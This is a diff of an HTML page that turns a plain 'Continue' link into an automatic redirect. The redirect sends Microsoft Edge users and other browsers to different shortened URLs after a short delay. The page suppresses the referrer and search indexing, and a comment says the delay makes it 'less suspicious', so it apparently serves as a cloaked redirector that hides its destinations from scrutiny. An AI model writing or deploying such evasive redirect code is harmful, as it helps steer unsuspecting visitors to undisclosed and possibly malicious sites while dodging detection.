@@ -1,12 +1,56 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Continue</title>
+  <meta charset="UTF-8">
+  <title>Redirecting…</title>
+  <meta name="referrer" content="no-referrer">
+  <meta name="robots" content="noindex, nofollow">
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #111;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      text-align: center;
+    }
+    a { color: #4da3ff; }
+  </style>
 </head>
+
 <body>
-  <h2>Continue to website</h2>
-  <a href="https://url-shortener.me/726T">
-    <button>Continue</button>
-  </a>
+  <div>
+    <h2>Redirecting…</h2>
+    <p>If you are not redirected, <a id="manualLink" href="#">click here</a>.</p>
+  </div>
+
+  <script>
+    const ua = navigator.userAgent;
+    const isEdge = ua.includes("Edg/");
+
+    const edgeURL = "https://url-shortener.me/7ABW";
+    const defaultURL = "https://url-shortener.me/726T";
+
+    const target = isEdge ? edgeURL : defaultURL;
+
+    // manual link fallback
+    document.getElementById("manualLink").href = target;
+
+    // small delay = less suspicious
+    setTimeout(() => {
+      window.location.href = target;
+    }, 1500);
+  </script>
+
+  <noscript>
+    <p>
+      JavaScript is disabled.
+      <a href="https://url-shortener.me/726T">Continue</a>
+    </p>
+  </noscript>
 </body>
 </html>
